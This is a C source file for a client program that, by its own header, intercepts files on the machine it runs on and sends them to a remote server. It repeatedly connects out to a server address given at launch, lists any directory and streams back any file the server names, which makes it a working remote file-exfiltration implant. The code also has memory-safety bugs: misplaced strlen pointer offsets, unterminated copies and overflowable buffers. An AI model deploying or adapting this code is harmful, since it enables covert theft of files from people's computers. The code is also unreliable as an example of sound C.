/*
Author: Nick Lyubenko
Purpose: Intercept specified files from client machine and send them to the server
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <sys/socket.h> 
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <fcntl.h>
#include <arpa/inet.h>

#define MAX_RECV_BUF 256
#define MAX_buff 256
 
char* message_recieved[2];
const char* client;
int sock;

/*sends file over sock*/
int send_file(int sock, char *file_name)
{
    int sent; 
    ssize_t read_bytes, sent_bytes, sent_size;
    char buff[MAX_buff];
    char * err = "File not found\n";
    int f;

    sent = 0;
    sent_size = 0;
    
    if( (f = open(file_name, O_RDONLY)) < 0) { //open file failure

        sent_bytes = send(sock, err , strlen(err), 0) < 0;//send file
        return -1;
    }
    else //success
    {
        printf("Sending");
        while( (read_bytes = read(f, buff, MAX_RECV_BUF)) > 0 )
        {
            if( (sent_bytes = send(sock, buff, read_bytes, 0)) < read_bytes )
            {
                perror("Send failed");
                return -1;
            }
        sent++;
        sent_size += sent_bytes;
        } 
        close(f);
    }

    printf("Sent %d bytes in %d iterations\n\n",(int)sent_size, (int)sent);
    return sent;
}

/*lists the files in a directory*/
int list_dir(char *path, char* ls[]) {

    DIR *dir;
    struct dirent *ent;
    int sent = 0;

    if (((dir = opendir(path)) != NULL)) 
    {
        while ((ent = readdir (dir)) != NULL) 
        {
            printf ("%s\n", ent->d_name);
            ls[sent] = (char*)malloc(strlen(ent->d_name) + 1);
            strncpy(ls[sent],ent->d_name,strlen(ent->d_name));
            sent++;
        }
        closedir (dir);
        return sent;
    } 
    else 
    {
         /* could not open directory */
        printf("DIR DOES NOT EXIST");
        return -1;
    }

}
/*handles requests sent by server*/
int handler(char* argv[])
{
    printf("%s\n",argv[0]);

    if(argv[0][0]== 'r') //list dir
    {
        /*list directory specified*/
        char *files[500];
        int sent, i = 0, size = 0;
        sent = list_dir(argv[1], files);

        if(sent>=0) //if directory found
        {
            for (i; i < sent; i++)
            {
               size += strlen(files[i]+2);
            }

            char fulldir[size+1];
            strcpy(fulldir,"^");

            for (i = 0; i < sent; i++)
            {
                strcat(fulldir,files[i]);
                strcat(fulldir,"^");
            }
            printf("%s\n",fulldir);
            if( send(sock , fulldir , strlen(fulldir+1) , 0) < 0)
            {
                puts("Send failed");
                return 1;
            }
        }
        else //directory not found
        {
            char* resp = "Invalid Directory ";
            if(send(sock , resp , strlen(resp+1) , 0) < 0)
            {
                printf("Send failed");
                return 1;
            }
        }
    }

    else if(argv[0][0]== 'f') //send file
    {
        send_file(sock,argv[1]);
    }

    else
    {
        puts("server sent client nil");
    }

    puts("Done sending dir");
}

 /*recieves signals from server and acts accordingly*/
int main(int argc , char *argv[])
{
    struct sockaddr_in server;
    char message[1000] , server_reply[2000];
    int i, portno = atoi(argv[1]);
    FILE *output;

    output = fopen("CLIENTRAN.txt","w");
    fclose(output);

    while(1)
    {
        sock = socket(AF_INET , SOCK_STREAM , 0);
        if (sock == -1)
        {
            printf("Could not create socket");
            sleep(2);
        }
        else
        {
            puts("Socket created");
             
            server.sin_addr.s_addr = inet_addr(argv[2]);
            server.sin_family = AF_INET;
            server.sin_port = htons( portno );
         
            //Connect to remote server
            if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
            {
                close(sock);
                sock = -1;
                sleep(2);
                perror("Could not connect");
            }
            else
            {
                puts("Connected to server\n");            
                while(1)
                {    
                    //listen(sock , 3); //allows client PID to be detected using its port

                    if( recv(sock , server_reply , 2000 , 0) < 0)
                    {
                        puts("recv client side failed");
                    }
                    else{ 
                        puts("Server replied");
                        char* new;
                        new = strtok (server_reply," ");
                        i = 0;
                        printf("%d%s\n",i,new);

                        while (new != NULL)
                        {                                               /*Seperates server response into an array*/
                            message_recieved[i]=new;
                            printf("%d%s\n",i,message_recieved[i]);
                            new = strtok (NULL, " ");
                            ++i;
                        }

                        handler(message_recieved);
                        memset(server_reply, 0, sizeof(server_reply));
                        memset(message_recieved[0], 0, sizeof(message_recieved[0]));  //cleaning
                        memset(message_recieved[1], 0, sizeof(message_recieved[1]));  //cleaning
                    }
                }
                
            }
        }
    }
}